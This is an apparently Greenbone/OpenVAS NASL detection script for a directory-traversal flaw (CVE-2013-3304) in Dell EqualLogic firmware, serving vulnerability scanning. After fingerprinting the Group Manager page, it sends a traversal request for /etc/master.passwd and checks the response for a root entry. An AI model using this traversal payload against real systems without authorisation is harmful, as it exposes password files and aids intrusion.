# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105100");
  script_cve_id("CVE-2013-3304");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_version("2023-07-26T05:05:09+0000");

  script_name("Dell EqualLogic Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/70760");
  script_xref(name:"URL", value:"http://dell.com");

  script_tag(name:"impact", value:"Exploiting this issue can allow an attacker to gain access to
arbitrary system files. Information harvested may aid in launching further attacks.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");
  script_tag(name:"insight", value:"Dell EqualLogicis fails to sufficiently sanitize user-supplied input.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"summary", value:"Dell EqualLogic is prone to a directory-traversal vulnerability.");

  script_tag(name:"affected", value:"Dell EqualLogic Firmware versions 6.0 is vulnerable. Other versions
may also be affected.");

  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-10-29 13:15:11 +0100 (Wed, 29 Oct 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");


  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("host_details.inc");

port = http_get_port( default:80 );

if( http_vuln_check( port:port, url:"/", pattern:"<title>.*EqualLogic.*Group Manager</title>", usecache:TRUE ) )
{
  url = '//../../../../../../../../etc/master.passwd';

  if( http_vuln_check( port:port, url:url, pattern:"root:.*:0:[01]:" ) )
  {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
  exit( 99 );
}

exit(0);
